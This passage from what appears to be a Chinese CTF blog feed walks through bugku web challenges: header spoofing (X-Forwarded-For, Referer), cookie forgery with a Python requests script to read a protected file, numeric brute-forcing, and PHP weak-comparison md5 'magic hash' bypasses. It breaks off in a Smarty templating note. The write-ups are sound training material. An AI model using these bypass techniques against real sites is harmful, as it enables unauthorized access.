id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP任意代码执行漏洞</p><blockquote><p>phpinfo():显示php相关信息<br>scandir(path):显示目录信息，以数组的形式存储</p></blockquote><h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.png" alt="word"><br><img src="b2.png" alt="word"><br>程序员本地访问：意思是本地。<br>写个XFF抓个包就能绕过去了。<br><img src="b3.png" alt="word"><br><img src="b4.png" alt="word"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">XFF伪造攻击</span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p><img src="c1.png" alt="head"><br><img src="c2.png" alt="head"><br>获得的信息很简单，只有一条：改源头<br>改出处为谷歌，得到flag<br><img src="c3.png" alt="head"><br><img src="c4.png" alt="head"></p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>跨站脚本攻击</p><blockquote><p>Referer：指定访问的源url。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-008</title>
      <link href="/2023/04/16/CTF-web-008/"/>
      <url>/2023/04/16/CTF-web-008/</url>
      
        <content type="html"><![CDATA[<p>题库来源：bugku<br>题型：web</p><span id="more"></span><h1 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="a1.png" alt="head"><br><img src="a2.png" alt="head"></p><p>首先，得到题目信息</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. cookies欺骗</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. url信息：</span><br><span class="line">http:<span class="comment">//114.67.175.224:15562/index.php?line=&amp;filename=a2V5cy50eHQ=</span></span><br><span class="line">    参数解释</span><br><span class="line">    line=                   传入行号，目前为空</span><br><span class="line">    filename=a2V5cy50eHQ=   传入文件名，文件名编码为base64</span><br><span class="line">    a2V5cy50eHQ=            base64编码，解码为：key.txt</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 对应的key.txt信息</span><br><span class="line">rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry</span><br></pre></td></tr></table></figure><p>信息上key.txt看不出任何有用的利用点</p><p>扫目录和文件扫不出所以然，着力点放在url上<br>题目提示，cookie伪造。题目信息传入变量只有两个，尝试传入一些信息获取有价值的信息</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.当filename为index.php时，指定行号，能获得一些代码信息</span><br><span class="line">http:<span class="comment">//114.67.175.224:15562/index.php?line=14&amp;filename=aW5kZXgucGhw</span></span><br><span class="line">网页返回：</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line">缺点是要手动调整行号，我们不知道文件到底有多少行，会浪费很多时间</span><br></pre></td></tr></table></figure><p>Python爬取文件内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 因为只有行号是变动的，写个脚本跑下来。</span></span><br><span class="line"><span class="string">b&#x27;error_reporting(0);\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;$file=base64_decode(isset($_GET[\&#x27;filename\&#x27;])?$_GET[\&#x27;filename\&#x27;]:&quot;&quot;);\r\n&#x27;</span></span><br><span class="line"><span class="string">b&quot;$line=isset($_GET[&#x27;line&#x27;])?intval($_GET[&#x27;line&#x27;]):0;\r\n&quot;</span></span><br><span class="line"><span class="string">b&#x27;if($file==\&#x27;\&#x27;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;$file_list = array(\r\n&#x27;</span></span><br><span class="line"><span class="string">b&quot;&#x27;0&#x27; =&gt;&#x27;keys.txt&#x27;,\r\n&quot;</span></span><br><span class="line"><span class="string">b&quot;&#x27;1&#x27; =&gt;&#x27;index.php&#x27;,\r\n&quot;</span></span><br><span class="line"><span class="string">b&#x27;);\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27; \r\n&#x27;</span></span><br><span class="line"><span class="string">b&quot;if(isset($_COOKIE[&#x27;margin&#x27;]) &amp;&amp; $_COOKIE[&#x27;margin&#x27;]==&#x27;margin&#x27;)&#123;\r\n&quot;</span></span><br><span class="line"><span class="string">b&quot;$file_list[2]=&#x27;keys.php&#x27;;\r\n&quot;</span></span><br><span class="line"><span class="string">b&#x27;&#125;\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27; \r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;if(in_array($file, $file_list))&#123;\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;$fa = file($file);\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;echo $fa[$line];\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#125;\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;?&gt;\r\n&#x27;</span></span><br></pre></td></tr></table></figure><p>放到编译器修改下就变成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目说Cookie伪造，这里重点看伪造部分</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重点信息：Cookie的键值对为 margin:margin</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 当cookie符合条件时，开放keys.php文件</span></span><br><span class="line">    <span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来只需要简单写个脚本把文件读取下来就行。下面是总的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写一个带指定cookie的</span></span><br><span class="line">header1 = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;margin=margin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">url, header</span>):</span><br><span class="line">    response = requests.get(url=url, headers=header)</span><br><span class="line">    <span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">word</span>(<span class="params">url, header</span>):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; <span class="number">50</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        req(url + <span class="string">&quot;?line=&#123;&#125;&amp;filename=aW5kZXgucGhw&quot;</span>.<span class="built_in">format</span>(a), header)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入你的带index的网址</span></span><br><span class="line">url1 = <span class="string">r&#x27;http://114.67.175.224:15562/index.php&#x27;</span></span><br><span class="line"><span class="comment"># 获取index.php所有的文件内容，只不过有些粗糙，得自己格式化</span></span><br><span class="line"><span class="comment"># word(url1, header)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入你的网址，获取flag</span></span><br><span class="line">url2 = <span class="string">&#x27;http://114.67.175.224:15562/index.php?line=&amp;filename=a2V5cy5waHA=&#x27;</span></span><br><span class="line">req(url2, header1)</span><br></pre></td></tr></table></figure><p>下面是获取出来的flag<br><img src="a3.png" alt="flag"><br><img src="a4.png" alt="flag"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>信息的读取和跑出能力：给你一串信息，要学会找攻击点。<br>涉及知识点：代码审计PHP<br>其他知识点：Python request的使用<br>重点：伪造Cookie再重新请求</p><h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.png" alt="head"><br><img src="b2.png" alt="head"><br><img src="b3.png" alt="head"><br>从题目当中得到的信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.网页的等式是随机变换的</span></span><br><span class="line"><span class="comment"># 2.传入的参数变量为value</span></span><br><span class="line"></span><br><span class="line">那么问题就转变为：</span><br><span class="line"><span class="number">1.</span>获取网页的等式，求出等式的值</span><br><span class="line"><span class="number">2.</span>将等式的值通过post形式传入后台，得到flag</span><br><span class="line"></span><br><span class="line">题目的难点：如何保证自己的等式值不过期</span><br><span class="line">解决办法：使用Session建立连接</span><br></pre></td></tr></table></figure><p>具体代码实现如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 获得计算等式并且进行计算后传入服务器，获得flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session</span>(<span class="params">url</span>):</span><br><span class="line">    reqs0 = requests.session()</span><br><span class="line">    reqs1 = reqs0.get(url)</span><br><span class="line">    ren = <span class="string">r&#x27;&lt;div&gt;(.*)&lt;/div&gt;&#x27;</span></span><br><span class="line">    strs = <span class="built_in">str</span>(reqs1.text)</span><br><span class="line">    num = <span class="built_in">eval</span>(re.search(ren, strs).group(<span class="number">1</span>).split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    key=&#123;<span class="string">&#x27;value&#x27;</span>: num&#125;</span><br><span class="line">    rx = reqs0.post(url, data=key)</span><br><span class="line">    <span class="built_in">print</span>(rx.content)</span><br><span class="line"></span><br><span class="line">session(url3)</span><br></pre></td></tr></table></figure><p>这个脚本是我自己写的，网络上的脚本使用的是request.get(url,data=key).text，但说实在的，用text获取的时候出了不少bug，浪费了不少时间。<br>所以使用content是最稳妥的<br>最后就得到flag了<br><img src="b4.png" alt="flag"><br><img src="b5.png" alt="flag"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>大致考点</p><blockquote><p>脚本编程，比较考验的是Python的代码能力。<br>Python的re，request模块<br>Python的eval将字符串转换为可执行代码</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-007</title>
      <link href="/2023/04/15/CTF-web-007/"/>
      <url>/2023/04/15/CTF-web-007/</url>
      
        <content type="html"><![CDATA[<h1 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="a1.png" alt="得题">;<br><img src="a2.png" alt="得题">;<br>根据提示，这是个数值爆破，理论上只需要按照数值进行爆破就行。<br><img src="a3.png" alt="k题">;<br><img src="a4.png" alt="k题">;<br>但是关键点在于这东西实在是太慢了……<br>简单写个python生成字典，字典的值是10000到99999的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">100000</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(i)+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="a5.png" alt="解题"><br>将生成的字典载入进去进行爆破，没几分钟就得到了flag：<br><img src="a6.png" alt="解题"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题型：数值爆破<br>技巧：先生成字典再进行爆破</p><h1 id="备份是个好东西"><a href="#备份是个好东西" class="headerlink" title="备份是个好东西"></a>备份是个好东西</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><img src="b1.png" alt="引入"><br><img src="b2.png" alt="引入"><br>尝试使用md5解码<br><img src="b4.png" alt="引入"></p><p>对代码进行分析<br><img src="b3.png" alt="引入"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="comment">// 假设为：strstr(&#x27;Hellod world!&#x27;,&#x27;world!&#x27;);</span></span><br><span class="line"><span class="comment">// 查找 &quot;world&quot; 在 &quot;Hello world!&quot; 中是否存在，如果是，返回该字符串及后面剩余部分：</span></span><br><span class="line"><span class="comment">// 此处的意思是获取url的变量，例如：http://www.xxx.com?$a=1&amp;$b=2,截取的是?$a=1&amp;$b=2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// substr(string,start,length)</span></span><br><span class="line"><span class="comment">// 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line"><span class="comment">// 假如是上面的?$a=1&amp;$b=2，截取掉前面的第一个字符串就变为：$a=1&amp;$b=2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// echo str_replace(&quot;world&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);</span></span><br><span class="line"><span class="comment">// 把字符串 &quot;Hello world!&quot; 中的字符 &quot;world&quot; 替换成 &quot;Peter&quot;：</span></span><br><span class="line"><span class="comment">// 意思为：删除key字符串</span></span><br><span class="line"><span class="comment">// 绕过点1：变量删除</span></span><br><span class="line"><span class="comment">// 解决办法：变量复写为kkeyey</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// parse_str() 函数把查询字符串解析到变量中。</span></span><br><span class="line"><span class="comment">// 注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</span></span><br><span class="line"><span class="comment">// 注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</span></span><br><span class="line"><span class="comment">// 说人话就是：将字符串解析为变量和值的关联数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="comment">// 当key1和key2的md5值相等时，得到flag</span></span><br><span class="line">    <span class="comment">// 关键点2：找到俩个相同值的md5</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码分析出来差不多是这样：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);  <span class="comment">// 变量双写绕过</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>)            <span class="comment">// 比较变量md5值是否相等</span></span><br><span class="line"><span class="variable">$key1</span> !== <span class="variable">$key2</span>                     <span class="comment">// 比较变量值是否相等</span></span><br></pre></td></tr></table></figure><p>php常见弱类型</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure><p>最终构造为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.67.175.224:17220/index.php?kkeyey1=s878926199a&amp;kkeyey2=s155964671a</span></span><br></pre></td></tr></table></figure><p>得到的flag：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0e5459932745177090343288558410200</span>e342768416822451524974117254469flag&#123;<span class="number">9</span>b6949ecd5508a59495fab9b05a33bfe&#125;鍙栧緱flag</span><br></pre></td></tr></table></figure><p><img src="b6.png" alt="flag"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php网站的备份文件:index.php.bak</span><br><span class="line">php弱类型绕过</span><br><span class="line">php str_replace 双写变量绕过</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-学习2023版-0030</title>
      <link href="/2023/04/14/SEC-Study-0030/"/>
      <url>/2023/04/14/SEC-Study-0030/</url>
      
        <content type="html"><![CDATA[<h1 id="模板技术"><a href="#模板技术" class="headerlink" title="模板技术"></a>模板技术</h1><h2 id="形态引入"><a href="#形态引入" class="headerlink" title="形态引入"></a>形态引入</h2><p>模板技术：格式形如：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;Title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">获取&#123;Title&#125;并且进行替换。</span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>html专门做视图<br>php代码专门做模板替换 =&gt; 调用数据库数据，按模板填充数据并且替换到html当中</p><h3 id="新闻列表"><a href="#新闻列表" class="headerlink" title="新闻列表"></a>新闻列表</h3><p>1、数据库创建新闻存储<br>2、代码连接数据库读取<br>3、页面进行自定义显示</p><h3 id="自写模版引用"><a href="#自写模版引用" class="headerlink" title="自写模版引用"></a>自写模版引用</h3><p>1、页面显示样式编排<br>2、显示数据插入页面<br>3、引用模版调用触发</p><h2 id="Smarty模版引用"><a href="#Smarty模版引用" class="headerlink" title="Smarty模版引用"></a>Smarty模版引用</h2><p>下载：<a href="https://github.com/smarty-php/smarty/releases">https://github.com/smarty-php/smarty/releases</a><br>使用：<br>1、创建一个文件夹，命名为smarty-demo。<br>2、下载Smarty对应版本并解压缩到该文件夹中。<br>3、创建一个PHP文件，命名为index.php，并在文件中添加以下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入 Smarty 类文件</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;smarty-demo/libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建 Smarty 实例</span></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>;</span><br><span class="line"><span class="comment">// 设置 Smarty 相关属性</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;template_dir = <span class="string">&#x27;smarty-demo/templates/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;compile_dir = <span class="string">&#x27;smarty-demo/templates_c/&#x27;</span>;</span><br><span 